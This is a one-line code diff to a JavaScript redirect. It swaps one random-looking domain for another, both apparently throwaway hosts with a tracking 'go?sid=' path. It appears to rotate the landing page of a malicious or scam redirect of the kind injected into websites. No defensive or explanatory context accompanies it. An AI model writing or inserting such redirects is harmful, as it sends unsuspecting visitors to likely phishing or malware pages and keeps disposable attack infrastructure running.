@@ -1,1 +1,1 @@
-window.location.href = "https://hematocya.cfd/OYpG/go?sid=7747";
+window.location.href = "https://verbalisat.sbs/MOK/go?sid=7747";
